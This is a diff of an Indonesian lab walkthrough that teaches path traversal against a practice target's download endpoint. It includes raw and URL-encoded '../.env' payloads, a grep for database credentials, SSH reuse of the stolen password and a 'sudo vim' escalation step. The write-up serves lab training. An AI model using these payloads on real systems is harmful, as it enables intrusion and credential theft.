@@ -202,8 +202,7 @@ Baseline membantu membedakan respons normal, error, dan traversal yang berhasil.
 ## 6.1 File Valid
 
 ```bash
-curl -i \
-  "$WEB/download?file=uu-1-2024.pdf"
+curl -i "$WEB/download?file=uu-1-2024.pdf"
 ```
 
 ### Contoh Response
@@ -213,20 +212,16 @@ HTTP/1.1 200 OK
 Content-Type: application/pdf
 ```
 
-Simpan response untuk perbandingan:
+Simpan header dan body response untuk perbandingan:
 
 ```bash
-curl -sS \
-  -D valid.headers \
-  -o valid.body \
-  "$WEB/download?file=uu-1-2024.pdf"
+curl -i "$WEB/download?file=uu-1-2024.pdf" > valid.response
 ```
 
 ## 6.2 File Tidak Ada
 
 ```bash
-curl -i \
-  "$WEB/download?file=missing.pdf"
+curl -i "$WEB/download?file=missing.pdf"
 ```
 
 ### Contoh Response
@@ -238,18 +233,18 @@ HTTP/1.1 404 Not Found
 Simpan response:
 
 ```bash
-curl -sS \
-  -D missing.headers \
-  -o missing.body \
-  "$WEB/download?file=missing.pdf"
+curl -i "$WEB/download?file=missing.pdf" > missing.response
 ```
 
 ## 6.3 Bandingkan
 
 ```bash
-wc -c valid.body missing.body
-diff -u missing.headers valid.headers
+wc -c valid.response missing.response
+head -n 10 valid.response
+head -n 10 missing.response
 ```
+
+File `.response` berisi header HTTP dan body karena menggunakan `-i`. Bandingkan status HTTP dan `Content-Type`; ukuran total response menjadi informasi tambahan, bukan bukti tunggal.
 
 ### Tujuan Baseline
 
@@ -266,27 +261,17 @@ Traversal sukses→ respons sukses tetapi isi file sensitif
 ## 7.1 Payload Dasar
 
 ```bash
-curl -i \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=../.env"
+curl -i "$WEB/download?file=../.env"
 ```
 
-Versi ringkas:
-
-```bash
-curl -s \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=../.env"
-```
+Opsi `-i` menampilkan header HTTP sekaligus isi response, sehingga status dan isi file dapat diperiksa dalam satu perintah.
 
 ## 7.2 Versi URL-Encoded
 
 Apabila karakter traversal difilter:
 
 ```bash
-curl -s \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=%2e%2e%2f.env"
+curl -i "$WEB/download?file=%2e%2e%2f.env"
 ```
 
 Variasi terbatas yang dapat diuji dalam scope lab:
@@ -300,15 +285,9 @@ Variasi terbatas yang dapat diuji dalam scope lab:
 
 Jangan melakukan fuzzing kedalaman tanpa batas. Uji hanya sejauh yang diperlukan untuk membuktikan dampak.
 
-## 7.3 Menggunakan `--path-as-is`
+## 7.3 Mengapa Cukup `curl -i`?
 
-```bash
-curl --path-as-is -i \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=../.env"
-```
-
-`--path-as-is` mencegah normalisasi segmen traversal pada komponen path URL. Pada kasus Statute, payload berada pada **query parameter**, sehingga hal terpenting adalah memastikan nilai parameter dikirim utuh atau di-URL-encode. Opsi ini tetap aman digunakan agar request tidak diubah oleh client.
+Pada kasus Statute, payload berada pada **query parameter** `file`, sehingga tidak memerlukan `--path-as-is`. Gunakan URL dalam tanda kutip seperti contoh di atas agar nilai parameter diteruskan utuh; variasi URL-encoded tersedia pada bagian 7.2.
 
 ## 7.4 Evidence yang Diharapkan
 
@@ -368,16 +347,15 @@ Aplikasi akhirnya membaca file di luar direktori yang seharusnya.
 ## 8.1 Simpan Hasil dengan Aman
 
 ```bash
-curl -s \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=../.env" \
-  -o statute.env
+curl -i "$WEB/download?file=../.env" > statute.response
 ```
+
+File `statute.response` menyimpan header HTTP beserta isi `.env`. Perintah berikut mengambil hanya baris konfigurasi yang relevan.
 
 ## 8.2 Tampilkan Variabel Relevan
 
 ```bash
-grep -E '^(DB_USERNAME|DB_PASSWORD|DB_DATABASE)=' statute.env
+grep -E '^(DB_USERNAME|DB_PASSWORD|DB_DATABASE)=' statute.response
 ```
 
 ### Evidence
@@ -763,9 +741,9 @@ Risiko keseluruhan lebih tinggi daripada penilaian setiap celah secara terpisah 
 | Tidak menemukan endpoint download | Hanya mengandalkan directory brute force | Jalankan `katana -u "$WEB"`, klik fitur download, dan periksa Burp/DevTools |
 | Tidak tahu nama parameter | Request normal belum dianalisis | Cari `file=`, `path=`, `document=`, atau parameter serupa |
 | `.env` menghasilkan 404 | Kedalaman traversal tidak tepat | Uji `../.env`, lalu `../../.env` secara terbatas |
-| `.env` menghasilkan 403 | Filter request atau WAF | Samakan header browser dan gunakan URL encoding |
-| Response kosong | File di-download sebagai attachment | Gunakan `-o` lalu baca file hasil download |
-| Curl mengubah payload | Normalisasi atau encoding | Gunakan URL encoding dan `--path-as-is` |
+| `.env` menghasilkan 403 | Akses ditolak atau input difilter | Periksa status dengan `curl -i` dan bandingkan request normal dengan variasi URL-encoded |
+| Isi response tidak terlihat | Body kosong atau respons berbeda dari yang diharapkan | Periksa status dan header dengan `curl -i`, lalu simpan response menggunakan `>` untuk diperiksa |
+| Payload tidak terkirim utuh | URL tidak dikutip atau encoding keliru | Gunakan URL dalam tanda kutip dan variasi URL-encoded pada bagian 7.2 |
 | SSH gagal | Password salah salin atau credential tidak digunakan ulang | Salin nilai persis, cek port 22, gunakan `ssh -vvv` |
 | `sudo -l` meminta password | Konfigurasi bukan NOPASSWD | Masukkan password akun `operator` |
 | `sudo vim` ditolak | Path binary tidak sama dengan sudoers | Gunakan `/usr/bin/vim` persis seperti output `sudo -l` |
@@ -787,17 +765,13 @@ katana -u "$WEB"
 ## 16.2 Ambil `.env`
 
 ```bash
-curl -s \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=../.env"
+curl -i "$WEB/download?file=../.env"
 ```
 
 Alternatif encoded:
 
 ```bash
-curl -s \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=%2e%2e%2f.env"
+curl -i "$WEB/download?file=%2e%2e%2f.env"
 ```
 
 Expected:
@@ -866,9 +840,7 @@ WEB="http://192.168.56.120:8080"
 katana -u "$WEB"
 # Temukan /download?file=... dan periksa request normal sebelum traversal.
 
-curl -s \
-  -H 'User-Agent: Mozilla/5.0' \
-  "$WEB/download?file=../.env"
+curl -i "$WEB/download?file=../.env"
 
 ssh operator@"$TARGET"
 # password dari DB_PASSWORD
